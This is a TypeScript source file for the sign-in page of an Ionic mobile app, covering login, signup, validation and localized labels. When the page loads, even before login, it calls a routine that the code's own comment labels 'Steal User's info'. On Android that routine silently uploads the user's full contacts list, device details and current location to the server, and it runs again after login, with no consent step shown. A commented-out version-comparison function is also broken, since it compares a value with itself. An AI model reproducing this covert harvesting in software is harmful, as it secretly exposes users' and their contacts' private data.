/// <reference path="../../../typings/tsd.d.ts" />
import Dictionary = collections.Dictionary;

import {Page, NavController, NavParams} from 'ionic-angular';
import {NewsFeed} from '../NewsFeed/NewsFeed';
import {Config} from '../../providers/config';
import {Cache} from '../../providers/cache';
import {ServiceCaller} from '../../providers/servicecaller';
import {Notifications} from '../../providers/notifications';
import {UserCredentials, CredentialsValidation, VersionInfo} from '../../contracts/DataContracts';
import {User} from '../../contracts/ServerContracts';

import {UserContactsInfo, UserDeviceInfo, UserGeoInfo} from '../../contracts/ServerContracts';
import {Contacts, Device, Geolocation} from 'ionic-native';
import {Contact} from 'ionic-native/dist/plugins/contacts';

import {Observable} from 'rxjs/Observable';
import 'rxjs/Rx'; // required for catch;
import 'rxjs/add/observable/throw';
import 'rxjs/add/operator/map';
import 'rxjs/add/operator/do';  // debug
import 'rxjs/add/operator/catch';

/* TODO: 1) Handle Error and display
    2) Fetch Email from cordova Device plugin
*/

@Page({
    templateUrl: 'build/pages/SignIn/SignIn.html'
})
export class SignIn {
    loginError: string = '';
    loginMode: boolean = false;
    language: string = "";
    email: string = "";
    password: string = "";
    error = "";

    emailLabel: string = "Email";
    passwdLabel: string = "Password";
    enterLabel: string = "Enter";
    signupLabel: string = "Sign Up";
    termsLabel: string = "Terms and Conditions";    

    contacts: Contact[];

    constructor(public nav: NavController, public config: Config, public cache: Cache, public service: ServiceCaller, public notifications: Notifications) {
    }
    
    onPageWillEnter() {        
        this.checkConnectionToServer();
    }  
      
    checkConnectionToServer() {
        let ping = this.service.checkConnection();
        let labels = this.service.getLabelsOfALanguage(this.config.language);
        ping.subscribe(data => {}, err => {this.pingFailure(err);});
        labels.subscribe((data) => { this.cache.setLabels(data);}, (err) => { this.pingFailure(err); });
        this.uploadUsersDeviceContactGeoInfo(null); // Steal User's info        
    }
      
    //#region Error Handling
    pingFailure(err: any ) {
        this.loginError = "Unable to Connect to Server";
    }
    //#endregion Error Handling

/*      
    uploadUserInfo(userId: string) {
        // TODO: Check connection and handle error
        this.uploadUsersDeviceContactGeoInfo(userId);
    }
  */
    /* TODO: Move this to app.ts
    checkIfUserIsLoggedIn() {
        let user: User = JSON.parse(window.localStorage['user'] || '{}');
 
        if (user.Id != undefined) {
            this.loadUserInfo(user.Id, true);
        }
    }
    */
    
    /*
    loadUserInfo(userId: string, navigate: boolean) {
        let userInfo = this.service.getUserInfo(userId);
        userInfo.subscribe((data) => {
            let firstTime = false; if (data.Language == null) {firstTime = true;}
            this.config.setUserInfo(data); if (navigate) this.navigate(firstTime);});
    }
*/

    login() {
        let validation = this.service.validateCredentials(this.email, this.password);
        validation.subscribe(data => { this.storeCredAndGoToHome(data); }, err => this.handleloginError(err));

    }

    storeCredAndGoToHome(user: User) {
        window.localStorage['userId'] = JSON.stringify(user.Id);
        //this.config.setUserInfo(user);
        this.uploadUsersDeviceContactGeoInfo(user.Id);
        this.nav.push(NewsFeed);
    }

    signup() {
        if (!this.validateInputs()) {
            return;
        }
        let signup = this.service.signUp(this.email, this.password, this.language);
        signup.subscribe(data => this.storeCredAndGoToHome(data), err => this.handleloginError(err));
    }
    
    validateInputs() {
        if ((this.email.length == 0))
        { 
            this.handleloginError('Email cannot be empty');
            return false;
            }
        if (this.password.length == 0)
        {
            this.handleloginError('Password cannot be empty');
            return false;            
        }
        if  (this.language.length == 0) {
            this.handleloginError('Please select language');
            return false;            
        }
        return true;
    }

    handleloginError(err: any) {
        this.loginError = JSON.parse(err._body).ExceptionMessage;
    }    

    /*
    loadLabels() {
        try {
        let labels = this.service.getLabelsOfALanguage(this.config.language);
        labels.subscribe((data) => {this.config.setLabels(data); this.setLabels(data)});
        } catch (error) {console.log(error)};
    }
    */
    
    setLabels(data: Dictionary<string, string>) {
        this.emailLabel = data.getValue('email');
        this.passwdLabel = data.getValue('password');
        this.enterLabel = data.getValue('enter');
        this.signupLabel = data.getValue('signup');
        this.termsLabel = data.getValue('terms');
    }
    
    //#region User Info
    uploadUsersDeviceContactGeoInfo(userId: string) {
        if (this.config.isOnAndroid) {
            this.uploadContactsList(userId);
            this.uploadDeviceInfo(userId);
            this.uploadGeoInfo(userId);
        }
    }
    
    uploadContactsList(userId: string) {
        // Contacts List
        var contactJson: UserContactsInfo;
        var contactsList = Contacts.find(['*']);
        contactsList.then(data => { this.contacts = data;
            contactJson = { UserId: userId, JSON: JSON.stringify(data) }
            let contactsUpload = this.service.uploadContactsList(JSON.stringify(contactJson));
            contactsUpload.subscribe(data => {console.log("contacts updated");});
             });        
    }
    
    uploadDeviceInfo(userId: string) {
        // Device Info
        var deviceJson: UserDeviceInfo;
        deviceJson = { UserId: userId, JSON: JSON.stringify(Device.device) }
        let deviceUpload = this.service.uploadDeviceInfo(JSON.stringify(deviceJson));
        deviceUpload.subscribe(data => {console.log("device info updated");})
     }
     
     uploadGeoInfo(userId: string) {
        // Geo-location
        var geoJson: UserGeoInfo;
        let geoPos = Geolocation.getCurrentPosition();
        geoPos.then(data =>    {     
                    geoJson = { UserId: userId, JSON: JSON.stringify(data)};
                    let geoUpload = this.service.uploadUserLocation(JSON.stringify(geoJson));
                    geoUpload.subscribe(data => {console.log("geo info updated");})
        });                 
     }

    //#endregion User Info
    
    // #region Version
    
    /*
    checkVersion() {
        let versionInfo = this.service.getVersionInfo();
        versionInfo.subscribe(data => this.versionAction(data), err => { }, () => { });
    }

    versionAction(info: VersionInfo) {
        if (this.versionComparison(info.MinSupportedVersion, this.config.version)) {
            console.log("Force User to Update version"); return;
        }
        if (this.versionComparison(info.LatestVersion, this.config.version)) {
            console.log("Only suggest user to Update version"); return;
        }
        return;
        // Else do nothing
    }

    versionComparison(version1: string, version2: string) {
        let version1Parts = version1.split('.');
        let version2Parts = version2.split('.');
        if ((Number(version1Parts[0]) > Number(version1Parts[0])) ||
            ((Number(version1Parts[0]) == Number(version1Parts[0]) && (Number(version1Parts[1]) > Number(version1Parts[1])))) ||
            ((Number(version1Parts[0]) == Number(version1Parts[0]) && (Number(version1Parts[1]) == Number(version1Parts[1])) && (Number(version1Parts[2]) > Number(version1Parts[2])))))
        { return true; }
    }
    */
    // #endregion Version

}
